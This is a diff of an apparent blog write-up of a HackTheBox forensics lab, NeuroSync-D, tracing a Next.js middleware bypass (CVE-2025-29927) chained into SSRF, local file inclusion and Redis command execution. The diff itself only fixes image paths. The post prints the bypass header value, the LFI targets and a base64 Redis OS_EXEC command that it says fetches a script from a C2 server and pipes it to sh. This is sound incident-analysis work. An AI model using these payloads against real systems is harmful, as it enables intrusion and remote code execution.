@@ -15,12 +15,12 @@ tags:
 title: 'HTB Sherlocks Write up NeuroSync D'
 ---
 # [HackTheBox Sherlocks - NeuroSync-D](https://app.hackthebox.com/sherlocks/NeuroSync-D)
-![88c28e4ff83a53a51595847681cbfab9.png](assets/resources-writeups/88c28e4ff83a53a51595847681cbfab9.png)
+![88c28e4ff83a53a51595847681cbfab9.png](/assets/resources-writeups/88c28e4ff83a53a51595847681cbfab9.png)
 **Scenario:**
 NeuroSync™ is a leading suite of products focusing on developing cutting edge medical BCI devices, designed by the Korosaki Coorporaton. Recently, an APT group targeted them and was able to infiltrate their infrastructure and is now moving laterally to compromise more systems. It appears that they have even managed to hijack a large number of online devices by exploiting an N-day vulnerability. Your task is to find out how they were able to compromise the infrastructure and understand how to secure it.
 
 * * *
-![a0cde20a073d5ec4a92ea8306e851214.png](assets/resources-writeups/a0cde20a073d5ec4a92ea8306e851214.png)
+![a0cde20a073d5ec4a92ea8306e851214.png](/assets/resources-writeups/a0cde20a073d5ec4a92ea8306e851214.png)
 
 On this sherlock, we will have to dig into how the Next.js middleware bypass could be exploited and could be chained for SSRF, Local File Inclusion and command execution on Redis! 
 
@@ -33,7 +33,7 @@ we will have 5 log files to investigate from
 
 >Task 1: What version of Next.js is the application using?
 
-![ade2336486fb2cece942c8e6419515fd.png](assets/resources-writeups/ade2336486fb2cece942c8e6419515fd.png)
+![ade2336486fb2cece942c8e6419515fd.png](/assets/resources-writeups/ade2336486fb2cece942c8e6419515fd.png)
 
 Since Next.js is React-based full-stack framework so we could inspect the `interface.log` to find out the version and also the local port that Next.js-based application was running on the server as shown in the image above.
 
@@ -48,15 +48,15 @@ Since Next.js is React-based full-stack framework so we could inspect the `inter
 
 >Task 3: A critical Next.js vulnerability was released in March 2025, and this version appears to be affected. What is the CVE identifier for this vulnerability?
 
-![c28e0a8bb94a5d569e8131cc270e10eb.png](assets/resources-writeups/c28e0a8bb94a5d569e8131cc270e10eb.png)
+![c28e0a8bb94a5d569e8131cc270e10eb.png](/assets/resources-writeups/c28e0a8bb94a5d569e8131cc270e10eb.png)
 
 In March 2025, the new Next.js middleware bypass vulnerability was disclosed with **9.1 CVSS** score which threat actor/attack can send the `x-middleware-subrequest` header that meant to be used internally with a specific value to **trick the application into treating them as internal subrequests** which effectively bypass middleware authorization and access the endpoint/resources that are not intended to be accessed without proper authorization.  
 
-![b16cd9bed4c7da3d6f3d5b6274acc801.png](assets/resources-writeups/b16cd9bed4c7da3d6f3d5b6274acc801.png)
+![b16cd9bed4c7da3d6f3d5b6274acc801.png](/assets/resources-writeups/b16cd9bed4c7da3d6f3d5b6274acc801.png)
 
 An article published on [Project Discovery](https://projectdiscovery.io/blog/nextjs-middleware-authorization-bypass) also provides different values that could be used with `x-middleware-subrequest` header on different version of vulnerable Next.js and also provides Nuclei template to discover this vulnerability.
 
-![435ca2036c9e979fd31214f254a1f89b.png](assets/resources-writeups/435ca2036c9e979fd31214f254a1f89b.png)
+![435ca2036c9e979fd31214f254a1f89b.png](/assets/resources-writeups/435ca2036c9e979fd31214f254a1f89b.png)
 
 The article also explained how this template works which will help us on this sherlock as well! 
 
@@ -66,11 +66,11 @@ CVE-2025-29927
 
 >Task 4: The attacker tried to enumerate some static files that are typically available in the Next.js framework, most likely to retrieve its version. What is the first file he could get?
 
-![0196e129488dfc2a15e293bd767e363e.png](assets/resources-writeups/0196e129488dfc2a15e293bd767e363e.png)
+![0196e129488dfc2a15e293bd767e363e.png](/assets/resources-writeups/0196e129488dfc2a15e293bd767e363e.png)
 
 Lets check out the `access.log` file which we can see that there is only a single IP address that interacted with the Next.js application.
 
-![a003ff40df544beda7fe95b4c093bd80.png](assets/resources-writeups/a003ff40df544beda7fe95b4c093bd80.png)
+![a003ff40df544beda7fe95b4c093bd80.png](/assets/resources-writeups/a003ff40df544beda7fe95b4c093bd80.png)
 
 Then we can read the content of the log file which we can see that the first HTTP response beside `/` happened at 11:37:44.
 
@@ -80,7 +80,7 @@ main-app.js
 
 >Task 5: Then the attacker appears to have found an endpoint that is potentially affected by the previously identified vulnerability. What is that endpoint?
 
-![52b6df7a7764762f1d9e4af57084d7db.png](assets/resources-writeups/52b6df7a7764762f1d9e4af57084d7db.png)
+![52b6df7a7764762f1d9e4af57084d7db.png](/assets/resources-writeups/52b6df7a7764762f1d9e4af57084d7db.png)
 
 We can see that after the attacker discovered main page of this Next.js application, an api endpoint was requested constantly by the attacker and the first 5 requests are resulted in Unauthorized response.
 
@@ -90,7 +90,7 @@ We can see that after the attacker discovered main page of this Next.js applicat
 
 >Task 6: How many requests to this endpoint have resulted in an "Unauthorized" response?
 
-![2ff32fe9e1570a4940e1262c1038b803.png](assets/resources-writeups/2ff32fe9e1570a4940e1262c1038b803.png)
+![2ff32fe9e1570a4940e1262c1038b803.png](/assets/resources-writeups/2ff32fe9e1570a4940e1262c1038b803.png)
 
 We know that the first 5 request to this api endpoint resulted in Unauthorized response but is there more?, the result from `grep 401 access.log` command shows that there are no more than this.
 
@@ -100,7 +100,7 @@ We know that the first 5 request to this api endpoint resulted in Unauthorized r
 
 >Task 7: When is a successful response received from the vulnerable endpoint, meaning that the middleware has been bypassed?
 
-![89447a341e7c1d699735e7065a4b9a47.png](assets/resources-writeups/89447a341e7c1d699735e7065a4b9a47.png)
+![89447a341e7c1d699735e7065a4b9a47.png](/assets/resources-writeups/89447a341e7c1d699735e7065a4b9a47.png)
 
 Then after those 5 unauthorized access, HTTP 200 status was seen from the 6th request and the rest and it indicates that the middleware authorization has been bypassed according to Nuclei template provides by [Project Discovery](https://projectdiscovery.io/blog/nextjs-middleware-authorization-bypass).
 
@@ -110,7 +110,7 @@ Then after those 5 unauthorized access, HTTP 200 status was seen from the 6th re
 
 >Task 8: Given the previous failed requests, what will most likely be the final value for the vulnerable header used to exploit the vulnerability and bypass the middleware?
 
-![8fee94ba380637d33571ea851dc3ceae.png](assets/resources-writeups/8fee94ba380637d33571ea851dc3ceae.png)
+![8fee94ba380637d33571ea851dc3ceae.png](/assets/resources-writeups/8fee94ba380637d33571ea851dc3ceae.png)
 
 Since the Next.js running on this application is 15.1 which mean the value of `x-middleware-subrequest` header has to be `middleware:middleware:middleware:middleware:middleware` to actually get to trigger this vulnerability 
 
@@ -122,7 +122,7 @@ x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
 
 >Task 9: The attacker chained the vulnerability with an SSRF attack, which allowed them to perform an internal port scan and discover an internal API. On which port is the API accessible?
 
-![1b09ac335741eb728aaeee9d8f8aacb9.png](assets/resources-writeups/1b09ac335741eb728aaeee9d8f8aacb9.png)
+![1b09ac335741eb728aaeee9d8f8aacb9.png](/assets/resources-writeups/1b09ac335741eb728aaeee9d8f8aacb9.png)
 
 We can inspect the `data-api.log` file which we can see that the attacker used curl to trigger SSRF vulnerability and discovered another internal API on port 4000 which attacker then proceed to find other endpoint on this API.
 
@@ -132,7 +132,7 @@ We can inspect the `data-api.log` file which we can see that the attacker used c
 
 >Task 10: After the port scan, the attacker starts a brute-force attack to find some vulnerable endpoints in the previously identified API. Which vulnerable endpoint was found?
 
-![f7042475e8f34040c76a5a282b19ce86.png](assets/resources-writeups/f7042475e8f34040c76a5a282b19ce86.png)
+![f7042475e8f34040c76a5a282b19ce86.png](/assets/resources-writeups/f7042475e8f34040c76a5a282b19ce86.png)
 
 We could keep scrolling until we finally see the payload that resemble Local File Inclusion vulnerability exploitation payload from `/logs` endpoint which attacker found that he could leverage `logFile` variable on this endpoint to list file from the server.
 
@@ -142,7 +142,7 @@ We could keep scrolling until we finally see the payload that resemble Local Fil
 
 >Task 11: When the vulnerable endpoint found was used maliciously for the first time?
 
-![f7042475e8f34040c76a5a282b19ce86.png](assets/resources-writeups/f7042475e8f34040c76a5a282b19ce86.png)
+![f7042475e8f34040c76a5a282b19ce86.png](/assets/resources-writeups/f7042475e8f34040c76a5a282b19ce86.png)
 
 We can see that the attacker started with `/etc/passwd` first then went to `/proc/self/environ` later.
 
@@ -157,7 +157,7 @@ Local File Inclusion
 
 >Task 13: What is the name of the file that was targeted the last time the vulnerable endpoint was exploited?
 
-![b796692387a8c743b2a92719f7da58d6.png](assets/resources-writeups/b796692387a8c743b2a92719f7da58d6.png)
+![b796692387a8c743b2a92719f7da58d6.png](/assets/resources-writeups/b796692387a8c743b2a92719f7da58d6.png)
 
 Lastly the attacker then used LFI to get secret key file from tmp directory before went to access Redis with the key obtained.
 
@@ -167,7 +167,7 @@ secret.key
 
 >Task 14: Finally, the attacker uses the sensitive information obtained earlier to create a special command that allows them to perform Redis injection and gain RCE on the system. What is the command string?
 
-![79efce5295123a9c70b884785a597551.png](assets/resources-writeups/79efce5295123a9c70b884785a597551.png)
+![79efce5295123a9c70b884785a597551.png](/assets/resources-writeups/79efce5295123a9c70b884785a597551.png)
 
 From redis log, we can see that the attacker executed base64 command after he successfully compromised secret key to access Redis.
 
@@ -177,11 +177,11 @@ OS_EXEC|d2dldCBodHRwOi8vMTg1LjIwMi4yLjE0Ny9oNFBsbjQvcnVuLnNoIC1PLSB8IHNo|f1f0c1f
 
 >Task 15: Once decoded, what is the command?
 
-![04e2d568d2a8e4db3133366bbbec8cbb.png](assets/resources-writeups/04e2d568d2a8e4db3133366bbbec8cbb.png)
+![04e2d568d2a8e4db3133366bbbec8cbb.png](/assets/resources-writeups/04e2d568d2a8e4db3133366bbbec8cbb.png)
 
 We can copy the base64 to decode it directly with CyberChef which we can see that the attacker trying to fetch the bash script from C2 and execute it.
 
-![7c3c171fd417253729cad642ed03a045.png](assets/resources-writeups/7c3c171fd417253729cad642ed03a045.png)
+![7c3c171fd417253729cad642ed03a045.png](/assets/resources-writeups/7c3c171fd417253729cad642ed03a045.png)
 
 We could also find the same command from `bci-device.log` which gave us an extra context that this command did not work due to the missing `wget` binary on the server.
 
